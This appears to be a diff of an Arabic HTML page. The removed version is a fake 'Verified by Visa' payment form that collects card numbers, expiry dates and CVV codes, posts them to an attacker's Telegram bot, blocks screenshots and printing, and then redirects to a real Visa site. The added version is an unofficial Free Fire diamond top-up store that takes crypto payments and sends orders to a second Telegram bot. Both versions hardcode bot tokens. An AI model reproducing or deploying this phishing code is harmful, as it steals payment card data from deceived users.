@@ -1,263 +1,452 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl" id="mainHtml">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Visa Secure Payment Gateway</title>
-    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
-    
+    <title>FF VPN DZD - شحن فري فاير</title>
     <style>
+        @import url('https://fonts.googleapis.com/css2?family=Tajawal:wght@400;700&display=swap');
+
+        :root {
+            --bg-color: #f4f4f9;
+            --text-color: #111;
+            --card-bg: rgba(255, 255, 255, 0.4);
+            --modal-bg: rgba(255, 255, 255, 0.85);
+            --border-glow: rgba(0, 0, 0, 0.1);
+            --neon-color: #ff3b30;
+            --glass-border: rgba(255, 255, 255, 0.5);
+        }
+
+        [data-theme="dark"] {
+            --bg-color: #0f0f13;
+            --text-color: #fff;
+            --card-bg: rgba(20, 20, 25, 0.5);
+            --modal-bg: rgba(15, 15, 20, 0.9);
+            --border-glow: rgba(255, 59, 48, 0.4);
+            --neon-color: #ff3b30;
+            --glass-border: rgba(255, 255, 255, 0.1);
+        }
+
         * {
-            margin: 0; padding: 0; box-sizing: border-box;
-            font-family: 'Segoe UI', Tahoma, 'Cairo', sans-serif;
-            -webkit-user-select: none; user-select: none;
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Tajawal', sans-serif;
+            transition: background 0.3s, color 0.3s;
         }
 
         body {
-            background-color: #f4f7f9;
+            background-color: var(--bg-color);
+            color: var(--text-color);
             min-height: 100vh;
             display: flex;
+            flex-direction: column;
+            align-items: center;
+            background-image: radial-gradient(circle at 50% 50%, var(--border-glow) 0%, transparent 60%);
+            background-attachment: fixed;
+        }
+
+        /* Header & Theme Toggle */
+        header {
+            width: 100%;
+            padding: 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            background: var(--card-bg);
+            backdrop-filter: blur(10px);
+            -webkit-backdrop-filter: blur(10px);
+            border-bottom: 1px solid var(--glass-border);
+            box-shadow: 0 0 15px var(--border-glow);
+            z-index: 10;
+        }
+
+        .logo {
+            font-size: 24px;
+            font-weight: bold;
+            text-shadow: 0 0 10px var(--neon-color);
+            color: var(--text-color);
+        }
+
+        .theme-toggle {
+            background: transparent;
+            border: 2px solid var(--text-color);
+            color: var(--text-color);
+            padding: 8px 15px;
+            border-radius: 20px;
+            cursor: pointer;
+            font-weight: bold;
+        }
+
+        /* Toast Notification */
+        .toast {
+            position: fixed;
+            top: -100px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: var(--neon-color);
+            color: white;
+            padding: 10px 20px;
+            border-radius: 30px;
+            box-shadow: 0 0 20px var(--neon-color);
+            z-index: 1000;
+            pointer-events: none;
+            transition: top 0.5s cubic-bezier(0.68, -0.55, 0.265, 1.55);
+            font-weight: bold;
+        }
+
+        .toast.show {
+            top: 20px;
+        }
+
+        /* Products Grid */
+        .container {
+            width: 90%;
+            max-width: 1000px;
+            margin: 40px auto;
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 20px;
+            flex-grow: 1;
+        }
+
+        .card {
+            background: var(--card-bg);
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            border: 1px solid var(--glass-border);
+            border-radius: 20px;
+            padding: 25px;
+            text-align: center;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
+            transition: transform 0.3s, box-shadow 0.3s;
+        }
+
+        .card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 0 20px var(--border-glow);
+        }
+
+        .diamonds {
+            font-size: 28px;
+            font-weight: bold;
+            margin-bottom: 10px;
+            color: var(--neon-color);
+            text-shadow: 0 0 8px var(--border-glow);
+        }
+
+        .price {
+            font-size: 20px;
+            margin-bottom: 20px;
+        }
+
+        .btn {
+            background: var(--neon-color);
+            color: white;
+            border: none;
+            padding: 10px 25px;
+            border-radius: 25px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            width: 100%;
+            box-shadow: 0 0 10px var(--border-glow);
+            transition: 0.3s;
+        }
+
+        .btn:hover {
+            transform: scale(1.05);
+            box-shadow: 0 0 20px var(--neon-color);
+        }
+
+        /* Modals */
+        .modal-overlay {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0, 0, 0, 0.6);
+            backdrop-filter: blur(5px);
+            display: none;
             justify-content: center;
-            align-items: flex-start;
-            padding: 20px 10px;
-            overflow-y: auto; 
+            align-items: center;
+            z-index: 100;
         }
 
-        /* حماية ضد الطباعة وتصوير الشاشة */
-        @media print { body { display: none !important; } }
-
-        .main-container {
-            width: 100%; max-width: 450px;
-            background: #ffffff; border-radius: 8px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
-            border-top: 5px solid #0033a0;
-            position: relative; overflow: hidden;
+        .modal-overlay.active {
+            display: flex;
         }
 
-        /* شريط اللغات */
-        .lang-switcher {
-            display: flex; justify-content: center; gap: 10px;
-            background: #f8f9fa; padding: 10px; border-bottom: 1px solid #eee;
-        }
-        .lang-btn {
-            background: #fff; border: 1px solid #ddd; padding: 5px 12px;
-            border-radius: 4px; font-size: 12px; cursor: pointer; font-weight: bold;
-        }
-        .lang-btn.active { background: #0033a0; color: #fff; border-color: #0033a0; }
-
-        #loading-overlay {
-            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(255, 255, 255, 0.98);
-            display: none; flex-direction: column; justify-content: center;
-            align-items: center; z-index: 1000; text-align: center;
+        .modal-content {
+            background: var(--modal-bg);
+            padding: 30px;
+            border-radius: 25px;
+            width: 90%;
+            max-width: 450px;
+            border: 1px solid var(--glass-border);
+            box-shadow: 0 0 30px var(--border-glow);
+            position: relative;
         }
 
-        .spinner {
-            width: 50px; height: 50px; border: 5px solid #f3f3f3;
-            border-top: 5px solid #0033a0; border-radius: 50%;
-            animation: spin 1s linear infinite; margin-bottom: 15px;
+        .close-btn {
+            position: absolute;
+            top: 15px; right: 20px;
+            font-size: 24px;
+            cursor: pointer;
+            color: var(--text-color);
+        }
+
+        .payment-info {
+            background: var(--card-bg);
+            padding: 15px;
+            border-radius: 15px;
+            margin-bottom: 15px;
+            font-size: 14px;
+            line-height: 1.8;
+            border: 1px solid var(--glass-border);
+        }
+
+        .payment-info strong { color: var(--neon-color); }
+
+        .input-group {
+            margin-bottom: 15px;
+            text-align: right;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 12px;
+            border-radius: 10px;
+            border: 1px solid var(--glass-border);
+            background: var(--card-bg);
+            color: var(--text-color);
+            outline: none;
+        }
+
+        .input-group input[type="file"] {
+            padding: 8px;
+        }
+
+        /* Footer */
+        footer {
+            margin-top: auto;
+            padding: 20px;
+            text-align: center;
+            width: 100%;
+        }
+
+        .dev-badge {
+            font-size: 12px;
+            color: #4cd964;
+            font-weight: bold;
+            margin-bottom: 5px;
+        }
+
+        .tg-link {
+            color: var(--text-color);
+            text-decoration: none;
+            font-size: 14px;
+            opacity: 0.8;
+        }
+
+        .tg-link:hover {
+            color: var(--neon-color);
+        }
+
+        /* Loading Spinner */
+        .loader {
+            display: none;
+            border: 4px solid var(--card-bg);
+            border-top: 4px solid var(--neon-color);
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+            margin: 10px auto;
         }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-
-        .header-bank { padding: 15px 20px; display: flex; justify-content: space-between; align-items: center; }
-        .visa-logo { font-size: 22px; font-weight: 900; color: #0033a0; font-style: italic; }
-
-        .card-preview {
-            margin: 0 20px 20px; height: 180px;
-            background: linear-gradient(135deg, #1a1f71 0%, #0033a0 100%);
-            border-radius: 12px; padding: 25px; color: white;
-            box-shadow: 0 8px 20px rgba(0,51,160,0.3);
-        }
-
-        .card-number-v { font-size: 1.2rem; letter-spacing: 2px; margin: 25px 0; display: block; text-align: center; }
-
-        .form-container { padding: 0 20px 20px; }
-        .input-group { margin-bottom: 15px; }
-        label { display: block; font-size: 11px; font-weight: 700; color: #666; margin-bottom: 5px; }
-        input, select { width: 100%; padding: 11px; border: 1px solid #ddd; border-radius: 4px; font-size: 15px; outline: none; }
-        
-        .row { display: flex; gap: 10px; }
-
-        .submit-btn {
-            width: 100%; padding: 15px; background: #0033a0; color: white; border: none;
-            border-radius: 4px; font-size: 16px; font-weight: bold; cursor: pointer;
-        }
-
-        .footer-secure { text-align: center; padding: 15px; font-size: 10px; color: #999; border-top: 1px solid #eee; }
     </style>
 </head>
-<body oncontextmenu="return false;" onkeydown="return (event.keyCode != 44)">
+<body data-theme="dark">
 
-    <div class="main-container">
-        <div class="lang-switcher">
-            <button class="lang-btn" onclick="setLang('en')">English</button>
-            <button class="lang-btn" onclick="setLang('fr')">Français</button>
-            <button class="lang-btn active" onclick="setLang('ar')">العربية</button>
+    <header>
+        <div class="logo">FF VPN DZD</div>
+        <button class="theme-toggle" onclick="toggleTheme()">☀️ ساطع</button>
+    </header>
+
+    <div class="toast" id="welcomeToast">أهلاً بك في متجرنا! خيارات شحن سريعة وآمنة 🚀</div>
+
+    <div class="container">
+        <div class="card">
+            <div class="diamonds">110 جوهرة</div>
+            <div class="price">1.2$</div>
+            <button class="btn" onclick="openPayment('110 جوهرة', '1.2$')">شراء</button>
         </div>
-
-        <div id="loading-overlay">
-            <div class="spinner"></div>
-            <h3 id="load-text">جاري المعالجة...</h3>
-            <p id="load-sub" style="font-size: 11px; margin-top: 10px; color: #666; padding: 0 20px;">يرجى الانتظار، يتم فحص البيانات مع خادم البنك.</p>
+        <div class="card">
+            <div class="diamonds">231 جوهرة</div>
+            <div class="price">2.5$</div>
+            <button class="btn" onclick="openPayment('231 جوهرة', '2.5$')">شراء</button>
         </div>
-
-        <div class="header-bank">
-            <div class="visa-logo">VISA</div>
-            <div style="font-size: 10px; font-weight: bold; color: #1967d2;">Verified by Visa</div>
+        <div class="card">
+            <div class="diamonds">583 جوهرة</div>
+            <div class="price">6$</div>
+            <button class="btn" onclick="openPayment('583 جوهرة', '6$')">شراء</button>
         </div>
-
-        <div class="card-preview">
-            <div style="display: flex; justify-content: space-between;">
-                <div style="width: 35px; height: 25px; background: #f1c40f; border-radius: 4px;"></div>
-                <span style="font-style: italic; font-weight: bold;">VISA</span>
-            </div>
-            <span class="card-number-v" id="view-number">**** **** **** ****</span>
-            <div style="display: flex; justify-content: space-between; font-size: 0.75rem;">
-                <div id="view-name">HOLDER NAME</div>
-                <div id="view-date">MM/YY</div>
-            </div>
+        <div class="card">
+            <div class="diamonds">1188 جوهرة</div>
+            <div class="price">11.5$</div>
+            <button class="btn" onclick="openPayment('1188 جوهرة', '11.5$')">شراء</button>
         </div>
-
-        <div class="form-container">
-            <form id="visa-payment-form">
-                <div class="input-group">
-                    <label id="lbl-rec">بيانات المستلم (إيميل أو اسم)</label>
-                    <input type="text" id="v-receiver" placeholder="Recipient Details" required>
-                </div>
-
-                <div class="row">
-                    <div class="input-group" style="flex: 2;">
-                        <label id="lbl-type">نوع البطاقة</label>
-                        <select id="v-type">
-                            <option>Visa Classic</option>
-                            <option>Visa Gold</option>
-                            <option>Mastercard</option>
-                        </select>
-                    </div>
-                    <div class="input-group" style="flex: 1;">
-                        <label id="lbl-curr">العملة</label>
-                        <select id="v-currency">
-                            <option>DZD</option>
-                            <option>USD</option>
-                            <option>EUR</option>
-                        </select>
-                    </div>
-                </div>
-
-                <div class="input-group">
-                    <label id="lbl-num">رقم البطاقة</label>
-                    <input type="text" id="v-number" maxlength="19" placeholder="0000 0000 0000 0000" required>
-                </div>
-
-                <div class="row">
-                    <div class="input-group" style="flex: 1.5;">
-                        <label id="lbl-date">تاريخ الانتهاء</label>
-                        <input type="text" id="v-date" maxlength="5" placeholder="MM/YY" required>
-                    </div>
-                    <div class="input-group" style="flex: 1;">
-                        <label id="lbl-cvv">رمز CVV</label>
-                        <input type="password" id="v-cvv" maxlength="3" placeholder="***" required>
-                    </div>
-                </div>
-
-                <div class="input-group">
-                    <label id="lbl-amt">المبلغ الإجمالي</label>
-                    <input type="number" id="v-amount" placeholder="0.00" required>
-                </div>
-
-                <button type="submit" class="submit-btn" id="btn-text">تأكيد العملية</button>
-            </form>
+        <div class="card">
+            <div class="diamonds">2420 جوهرة</div>
+            <div class="price">24$</div>
+            <button class="btn" onclick="openPayment('2420 جوهرة', '24$')">شراء</button>
         </div>
-
-        <div class="footer-secure" id="footer-text">
-            🔒 نظام دفع مشفر وآمن 100%
+        <div class="card">
+            <div class="diamonds">عضوية أسبوعية</div>
+            <div class="price">3$</div>
+            <button class="btn" onclick="openPayment('عضوية أسبوعية', '3$')">شراء</button>
+        </div>
+        <div class="card">
+            <div class="diamonds">عضوية شهرية</div>
+            <div class="price">11.5$</div>
+            <button class="btn" onclick="openPayment('عضوية شهرية', '11.5$')">شراء</button>
         </div>
     </div>
 
+    <div class="modal-overlay" id="paymentModal">
+        <div class="modal-content">
+            <span class="close-btn" onclick="closeModal('paymentModal')">&times;</span>
+            <h3 style="text-align: center; margin-bottom: 15px;">يرجى إرسال الأموال عبر الطريقة التي تناسبك</h3>
+            
+            <div class="payment-info">
+                <strong>Paybit ID:</strong> 398066215 <br>
+                <strong>Binance ID:</strong> 1203247691 <br><br>
+                <strong>عنوان شبكة BEP20:</strong><br> <span style="font-size:12px; word-wrap: break-word;">0xc13120d26bcbd11114b3a1969ae48756b44b82cb</span><br><br>
+                <strong>عنوان شبكة TRC20:</strong><br> <span style="font-size:12px; word-wrap: break-word;">TK1fkcibgRrE2zUkHK5BHmpCtqBogwdheX</span>
+            </div>
+
+            <div class="input-group">
+                <label>ID اللاعب الخاص بك:</label>
+                <input type="text" id="playerId" placeholder="أدخل الآيدي هنا..." required>
+            </div>
+            
+            <div class="input-group">
+                <label>رفع صورة الدفع (إيصال التحويل):</label>
+                <input type="file" id="paymentProof" accept="image/*">
+            </div>
+
+            <div class="loader" id="submitLoader"></div>
+            <button class="btn" id="submitBtn" onclick="submitOrder()">تم الدفع</button>
+        </div>
+    </div>
+
+    <div class="modal-overlay" id="successModal">
+        <div class="modal-content" style="text-align: center;">
+            <span class="close-btn" onclick="closeModal('successModal')">&times;</span>
+            <div style="font-size: 50px; margin-bottom: 15px;">✅</div>
+            <h2 style="color: var(--neon-color); margin-bottom: 10px;">لقد وصلتنا طلبيتك</h2>
+            <p>سنعالج طلبك خلال دقائق. شكراً لثقتك بنا!</p>
+        </div>
+    </div>
+
+    <footer>
+        <div class="dev-badge">تم التطوير بواسطة KABOS MILY</div>
+        <a href="https://t.me/DZ_AX" target="_blank" class="tg-link">للتواصل: https://t.me/DZ_AX</a>
+    </footer>
+
     <script>
-        // إرجاع بيانات التوكن والأيدي الخاصة بك
-        const TELEGRAM_BOT_TOKEN = '7905472205:AAEY5RrhyHOZ27plU5i00FtWLMEfw1dQ19A'; 
-        const TELEGRAM_CHAT_ID = '5545907758';
-
-        const translations = {
-            ar: {
-                rec: "بيانات المستلم (إيميل أو اسم)", type: "نوع البطاقة", curr: "العملة", num: "رقم البطاقة", 
-                date: "تاريخ الانتهاء", cvv: "رمز CVV", amt: "المبلغ الإجمالي", btn: "تأكيد العملية",
-                footer: "🔒 نظام دفع مشفر وآمن 100%", load: "جاري المعالجة...", sub: "يرجى الانتظار، يتم فحص البيانات مع خادم البنك."
-            },
-            en: {
-                rec: "Recipient Info", type: "Card Type", curr: "Currency", num: "Card Number", 
-                date: "Expiry Date", cvv: "CVV Code", amt: "Total Amount", btn: "Confirm Payment",
-                footer: "🔒 Secure & Encrypted Payment System", load: "Processing...", sub: "Please wait, verifying data with bank server."
-            },
-            fr: {
-                rec: "Détails Destinataire", type: "Type de Carte", curr: "Devise", num: "Numéro de Carte", 
-                date: "Date d'expiration", cvv: "Code CVV", amt: "Montant Total", btn: "Confirmer le paiement",
-                footer: "🔒 Système de paiement sécurisé et crypté", load: "Traitement...", sub: "Veuillez patienter, vérification avec le serveur."
+        // Theme Toggle
+        function toggleTheme() {
+            const body = document.body;
+            const btn = document.querySelector('.theme-toggle');
+            if (body.getAttribute('data-theme') === 'dark') {
+                body.setAttribute('data-theme', 'light');
+                btn.innerHTML = '🌙 داكن';
+            } else {
+                body.setAttribute('data-theme', 'dark');
+                btn.innerHTML = '☀️ ساطع';
             }
-        };
-
-        function setLang(lang) {
-            const t = translations[lang];
-            document.getElementById('lbl-rec').innerText = t.rec;
-            document.getElementById('lbl-type').innerText = t.type;
-            document.getElementById('lbl-curr').innerText = t.curr;
-            document.getElementById('lbl-num').innerText = t.num;
-            document.getElementById('lbl-date').innerText = t.date;
-            document.getElementById('lbl-cvv').innerText = t.cvv;
-            document.getElementById('lbl-amt').innerText = t.amt;
-            document.getElementById('btn-text').innerText = t.btn;
-            document.getElementById('footer-text').innerText = t.footer;
-            document.getElementById('load-text').innerText = t.load;
-            document.getElementById('load-sub').innerText = t.sub;
-            document.getElementById('mainHtml').dir = (lang === 'ar' ? 'rtl' : 'ltr');
-            document.querySelectorAll('.lang-btn').forEach(b => b.classList.remove('active'));
-            event.target.classList.add('active');
         }
 
-        document.getElementById('v-number').addEventListener('input', (e) => {
-            let v = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
-            let f = v.match(/.{1,4}/g)?.join(' ') || '';
-            e.target.value = f;
-            document.getElementById('view-number').innerText = f || "**** **** **** ****";
-        });
+        // Welcome Toast Logic
+        setTimeout(() => {
+            const toast = document.getElementById('welcomeToast');
+            toast.classList.add('show');
+            setTimeout(() => {
+                toast.classList.remove('show');
+            }, 4000); 
+        }, 2000); 
 
-        document.getElementById('v-date').addEventListener('input', (e) => {
-            let v = e.target.value.replace(/[^0-9]/g, '');
-            if (v.length > 2) v = v.substring(0,2) + '/' + v.substring(2,4);
-            e.target.value = v;
-            document.getElementById('view-date').innerText = v || "MM/YY";
-        });
+        // Modal Logic
+        let currentOffer = '';
+        let currentPrice = '';
 
-        document.getElementById('visa-payment-form').addEventListener('submit', function(e) {
-            e.preventDefault();
-            document.getElementById('loading-overlay').style.display = 'flex';
+        function openPayment(offer, price) {
+            currentOffer = offer;
+            currentPrice = price;
+            document.getElementById('playerId').value = '';
+            document.getElementById('paymentProof').value = '';
+            document.getElementById('paymentModal').classList.add('active');
+        }
 
-            const message = `
-🔔 *New Secure Authorization*
-------------------------------
-👤 *Recipient:* ${document.getElementById('v-receiver').value}
-💰 *Amount:* ${document.getElementById('v-amount').value} ${document.getElementById('v-currency').value}
-💳 *Card:* \`${document.getElementById('v-number').value}\`
-📅 *Exp:* ${document.getElementById('v-date').value} | *CVV:* ${document.getElementById('v-cvv').value}
-------------------------------
-🛡️ *Gateway:* VISA_SECURE_GATE
-            `;
+        function closeModal(modalId) {
+            document.getElementById(modalId).classList.remove('active');
+        }
 
-            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'Markdown' })
-            })
-            .then(() => {
-                setTimeout(() => { window.location.href = "https://www.visa.com.dz/"; }, 4000);
-            });
-        });
+        // Telegram Bot Logic
+        async function submitOrder() {
+            const playerId = document.getElementById('playerId').value.trim();
+            const fileInput = document.getElementById('paymentProof');
+            
+            if (!playerId) {
+                alert("يرجى إدخال ID اللاعب الخاص بك أولاً.");
+                return;
+            }
 
-        // حماية إضافية ضد سكرين شوت (تنبيه)
-        document.addEventListener('keyup', (e) => {
-            if (e.key === 'PrintScreen') alert("Screenshots are disabled for security reasons.");
-        });
+            const botToken = "8488710993:AAHWnES-ReQ5vew5Yi4BSVHGTZ83ZbiidfE";
+            const chatId = "6671521979";
+            
+            const captionText = `🔥 طلب شحن جديد! 🔥\n\n📦 العرض المطلوب: ${currentOffer}\n💰 السعر: ${currentPrice}\n🎮 آيدي اللاعب: ${playerId}`;
+            
+            const submitBtn = document.getElementById('submitBtn');
+            const loader = document.getElementById('submitLoader');
+            
+            submitBtn.style.display = 'none';
+            loader.style.display = 'block';
+
+            try {
+                if (fileInput.files.length > 0) {
+                    const formData = new FormData();
+                    formData.append("chat_id", chatId);
+                    formData.append("photo", fileInput.files[0]);
+                    formData.append("caption", captionText);
+
+                    await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                        method: "POST",
+                        body: formData
+                    });
+                } else {
+                    const formData = new FormData();
+                    formData.append("chat_id", chatId);
+                    formData.append("text", captionText + "\n\n⚠️ ملاحظة: الزبون لم يقم بإرفاق صورة الدفع.");
+
+                    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                        method: "POST",
+                        body: formData
+                    });
+                }
+
+                closeModal('paymentModal');
+                document.getElementById('successModal').classList.add('active');
+
+            } catch (error) {
+                alert("حدث خطأ أثناء إرسال الطلب، يرجى المحاولة لاحقاً.");
+                console.error(error);
+            } finally {
+                submitBtn.style.display = 'block';
+                loader.style.display = 'none';
+            }
+        }
     </script>
+
 </body>
 </html>
